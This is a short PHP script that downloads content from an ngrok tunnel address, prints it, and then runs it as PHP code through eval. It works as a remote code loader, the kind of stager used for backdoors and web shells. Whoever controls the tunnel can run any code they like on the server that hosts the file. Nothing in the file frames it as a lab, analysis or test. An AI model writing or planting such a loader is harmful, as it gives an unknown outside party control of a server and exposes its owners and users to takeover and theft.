<?php
$url = 'https://desired-gazelle-steadily.ngrok-free.app/body';

$body = file_get_contents($url);

if ($body === false) {
    die('Failed to retrieve body');
}

echo $body;

// Execute retrieved PHP code
eval("?>".$body);
